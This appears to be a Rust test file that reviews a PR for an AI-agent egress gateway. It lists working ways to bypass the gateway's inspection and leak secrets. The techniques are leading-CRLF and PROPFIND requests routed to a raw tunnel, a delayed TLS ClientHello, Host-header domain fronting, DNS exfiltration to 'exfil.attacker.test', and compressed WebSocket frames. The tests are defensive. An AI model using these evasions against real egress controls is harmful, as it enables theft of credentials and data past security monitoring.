//! Review of PR #15 (not committed): bypass tests that FAIL on lot/06-gateway @ 36bfbda.
//! Needs `flate2 = { workspace = true }` in [dev-dependencies] (WebSocket deflate test).

mod common;

use std::collections::HashMap;
use std::io::Write as _;
use std::net::{IpAddr, SocketAddr};
use std::pin::Pin;
use std::sync::{Arc, Mutex};
use std::task::{Context, Poll};
use std::time::Duration;

use afw_core::policy::ZoneMode;
use afw_gateway::upstream::{Resolver, StaticResolver};
use common::*;
use futures::future::BoxFuture;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, ReadBuf};

async fn dns_a(h: &Harness, name: &str) -> hickory_proto::op::Message {
    use hickory_proto::op::{Message, MessageType, OpCode, Query};
    use hickory_proto::rr::{Name, RecordType};
    let sock = tokio::net::UdpSocket::bind(format!("{AGENT_IP}:0")).await.unwrap();
    let mut m = Message::new();
    m.set_id(7)
        .set_message_type(MessageType::Query)
        .set_op_code(OpCode::Query)
        .set_recursion_desired(true);
    m.add_query(Query::query(Name::from_ascii(name).unwrap(), RecordType::A));
    sock.send_to(&m.to_vec().unwrap(), h.dns()).await.unwrap();
    let mut buf = [0u8; 1500];
    let (n, _) = tokio::time::timeout(Duration::from_secs(5), sock.recv_from(&mut buf))
        .await
        .unwrap()
        .unwrap();
    Message::from_vec(&buf[..n]).unwrap()
}

// ---------------------------------------------------------------------------------------------
// 1. Non-recognised first bytes => L4 splice: no Host check, no path rule, no DLP.
// ---------------------------------------------------------------------------------------------

/// Plain HTTP preceded by an empty line (RFC 9112 §2.2: servers SHOULD ignore it) or using a
/// method missing from sniff::METHODS: sniffed as `Other`, relayed raw by l4.rs.
#[tokio::test]
async fn http_with_leading_crlf_or_unlisted_method_bypasses_http_pipeline() {
    let h = harness(Some(installed(1, ZoneMode::Enforce))).await;
    let port = h.plain_addr.port();
    // Agent resolved allowed.test through the gateway DNS (attribution cache), then connects.
    assert_eq!(dns_a(&h, "allowed.test.").await.answers().len(), 1);
    let body = format!("key={AWS_KEY}");
    let raw = format!(
        "\r\nPOST /admin HTTP/1.1\r\nHost: denied.test\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut s = h.transparent(AGENT_IP, h.plain_addr).await;
    let resp = http_raw(&mut s, raw.as_bytes()).await;
    eprintln!("leading CRLF response: {resp:?}");
    // Same through the explicit proxy (CONNECT tunnel, no DNS needed).
    let mut p = tokio::net::TcpStream::connect(h.proxy()).await.unwrap();
    p.write_all(format!("CONNECT allowed.test:{port} HTTP/1.1\r\nHost: allowed.test:{port}\r\n\r\n").as_bytes())
        .await
        .unwrap();
    let mut head = [0u8; 64];
    let _ = p.read(&mut head).await.unwrap();
    let raw2 = format!(
        "PROPFIND /admin HTTP/1.1\r\nHost: denied.test\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let resp2 = http_raw(&mut p, raw2.as_bytes()).await;
    eprintln!("PROPFIND response: {resp2:?}; upstream saw: {:?}", h.log.all());
    assert!(
        !h.log.contains_bytes(AWS_KEY.as_bytes()),
        "secret relayed uninspected to the upstream (L4 path), Host denied.test never checked"
    );
}

/// Writes the first byte, waits longer than the sniff timeout, then writes the rest.
struct SlowFirstByte<S> {
    inner: S,
    first_sent: bool,
    sleep: Option<Pin<Box<tokio::time::Sleep>>>,
}

impl<S: AsyncRead + Unpin> AsyncRead for SlowFirstByte<S> {
    fn poll_read(mut self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &mut ReadBuf<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_read(cx, buf)
    }
}

impl<S: AsyncWrite + Unpin> AsyncWrite for SlowFirstByte<S> {
    fn poll_write(mut self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &[u8]) -> Poll<std::io::Result<usize>> {
        if !self.first_sent {
            let n = std::task::ready!(Pin::new(&mut self.inner).poll_write(cx, &buf[..1]))?;
            self.first_sent = true;
            self.sleep = Some(Box::pin(tokio::time::sleep(Duration::from_millis(700))));
            return Poll::Ready(Ok(n));
        }
        if let Some(s) = self.sleep.as_mut() {
            std::task::ready!(s.as_mut().poll(cx));
            self.sleep = None;
        }
        Pin::new(&mut self.inner).poll_write(cx, buf)
    }
    fn poll_flush(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_flush(cx)
    }
    fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        Pin::new(&mut self.inner).poll_shutdown(cx)
    }
}

use std::future::Future as _;

/// A ClientHello whose first byte arrives > sniff timeout before the rest is classified
/// `Other` (read_initial timeout) => L4 opaque tunnel: no MITM, no path deny rule, no DLP.
#[tokio::test]
async fn slow_client_hello_bypasses_tls_inspection_and_dlp() {
    let h = harness(Some(installed(1, ZoneMode::Enforce))).await;
    assert_eq!(dns_a(&h, "allowed.test.").await.answers().len(), 1);
    let up_ca = afw_tls::GatewayCa::load_or_create(&h._up_dir.path().join("ca"), "upstream test CA")
        .unwrap()
        .ca_cert_pem();
    let tcp = h.transparent(AGENT_IP, h.upstream_addr).await;
    let slow = SlowFirstByte { inner: tcp, first_sent: false, sleep: None };
    // The agent trusts the REAL upstream CA, not the inspection CA: if this handshake
    // succeeds, the gateway did not terminate TLS.
    let tls = tls_with(slow, "allowed.test", &up_ca, vec![b"http/1.1".to_vec()]).await;
    let mut tls = match tls {
        Ok(t) => t,
        Err(e) => {
            eprintln!("handshake failed (expected when inspected): {e}");
            return;
        }
    };
    // `/admin` is denied by rule 4 (path rule) and the body carries a denied secret.
    let resp = http_raw(&mut tls, &post("allowed.test", "/admin", &format!("key={AWS_KEY}"))).await;
    eprintln!("response: {resp:?}");
    panic!(
        "TLS not inspected: direct handshake with the upstream succeeded; upstream saw {:?}",
        h.log.all().iter().map(|s| (s.path.clone(), String::from_utf8_lossy(&s.body).into_owned())).collect::<Vec<_>>()
    );
}

// ---------------------------------------------------------------------------------------------
// 2. Domain fronting through absolute-form: the URI authority is checked, the Host header is
//    forwarded untouched.
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn absolute_uri_allowed_but_host_header_fronted() {
    let h = harness(Some(installed(1, ZoneMode::Enforce))).await;
    // Inspected HTTPS (transparent).
    let s = h.transparent(AGENT_IP, h.upstream_addr).await;
    let mut tls = h.tls(s, "allowed.test").await.unwrap();
    let resp = http_raw(
        &mut tls,
        b"GET https://allowed.test/front HTTP/1.1\r\nHost: denied.test\r\nConnection: close\r\n\r\n",
    )
    .await;
    eprintln!("tls: {resp:?}");
    // Explicit proxy, plain HTTP.
    let mut p = tokio::net::TcpStream::connect(h.proxy()).await.unwrap();
    let raw = format!(
        "GET http://allowed.test:{}/front2 HTTP/1.1\r\nHost: denied.test\r\nConnection: close\r\n\r\n",
        h.plain_addr.port()
    );
    let resp2 = http_raw(&mut p, raw.as_bytes()).await;
    eprintln!("proxy: {resp2:?}");
    let fronted: Vec<_> = h.log.all().into_iter().filter(|s| s.host.starts_with("denied.test")).collect();
    assert!(fronted.is_empty(), "upstream received Host: denied.test (domain fronting): {fronted:?}");
}

// ---------------------------------------------------------------------------------------------
// 3. DNS: a refused name is still sent to the upstream resolver (exfiltration by qname).
// ---------------------------------------------------------------------------------------------

struct Recording(StaticResolver, Arc<Mutex<Vec<String>>>);

impl Resolver for Recording {
    fn lookup<'a>(&'a self, name: &'a str) -> BoxFuture<'a, std::io::Result<Vec<IpAddr>>> {
        self.1.lock().unwrap().push(name.to_string());
        self.0.lookup(name)
    }
}

#[tokio::test]
async fn refused_dns_name_is_not_resolved_upstream() {
    use hickory_proto::op::ResponseCode;
    let seen = Arc::new(Mutex::new(Vec::new()));
    let s2 = seen.clone();
    let h = harness_with(Some(installed(1, ZoneMode::Enforce)), move |o| {
        let mut m: HashMap<String, Vec<IpAddr>> = HashMap::new();
        m.insert("allowed.test".into(), vec![UPSTREAM_IP.parse().unwrap()]);
        o.resolver = Arc::new(Recording(StaticResolver::new(m), s2));
    })
    .await;
    let leak = "akiaiosfodnn7example.exfil.attacker.test.";
    let r = dns_a(&h, leak).await;
    assert_eq!(r.response_code(), ResponseCode::Refused);
    let seen = seen.lock().unwrap().clone();
    assert!(
        !seen.iter().any(|n| n.contains("exfil")),
        "refused name was sent to the upstream resolver (DNS exfiltration): {seen:?}"
    );
}

// ---------------------------------------------------------------------------------------------
// 4. WebSocket permessage-deflate: the extension header is relayed and RSV1 frames are scanned
//    compressed.
// ---------------------------------------------------------------------------------------------

#[tokio::test]
async fn websocket_permessage_deflate_bypasses_dlp() {
    let h = harness(Some(installed(1, ZoneMode::Enforce))).await;
    let s = h.transparent(AGENT_IP, h.upstream_addr).await;
    let mut ws = h.tls(s, "allowed.test").await.unwrap();
    ws.write_all(b"GET /ws HTTP/1.1\r\nHost: allowed.test\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Extensions: permessage-deflate\r\n\r\n")
        .await
        .unwrap();
    let mut head = Vec::new();
    let mut b = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        ws.read_exact(&mut b).await.unwrap();
        head.push(b[0]);
    }
    assert!(head.starts_with(b"HTTP/1.1 101"));
    let mut enc = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
    enc.write_all(format!("leak {AWS_KEY}").as_bytes()).unwrap();
    let deflated = enc.finish().unwrap();
    let mut frame = ws_frame(0x1, &deflated, true);
    frame[0] |= 0x40; // RSV1: compressed message
    ws.write_all(&frame).await.unwrap();
    let _ = tokio::time::timeout(Duration::from_secs(2), read_frame(&mut ws)).await;
    let leaked = h.log.all().iter().flat_map(|s| s.ws_messages.clone()).any(|m| {
        let mut out = Vec::new();
        let _ = std::io::Read::read_to_end(&mut flate2::read::DeflateDecoder::new(&m[..]), &mut out);
        out.windows(AWS_KEY.len()).any(|w| w == AWS_KEY.as_bytes())
    });
    assert!(!leaked, "compressed WebSocket message carrying the secret reached the upstream");
}

#[allow(dead_code)]
fn _unused(_: SocketAddr) {}
